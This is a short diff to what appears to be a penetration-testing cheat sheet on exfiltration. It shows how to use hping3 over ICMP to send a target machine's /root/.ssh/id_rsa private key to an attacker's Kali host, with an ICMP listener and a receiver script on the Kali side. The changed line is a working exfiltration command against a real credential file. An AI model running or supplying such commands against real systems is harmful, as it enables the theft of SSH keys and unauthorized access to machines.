@@ -3016,7 +3016,7 @@ Summary: Tools like hping3 can be used to read local files and send the contents
  	sudo hping3 --icmp 127.0.0.1 --listen signature --safe 
 
 # On Target machine, outputing to Kali:
-  	hping3 --icmp 192.168.x.x -d 100 --sign signature --file /root/.ssh/id_rsa 
+  	hping3 --icmp 192.168.x.x -d 100 --file /root/.ssh/id_rsa 
 
 # On kali machine
   	sudo python ./icmp_receiver.py
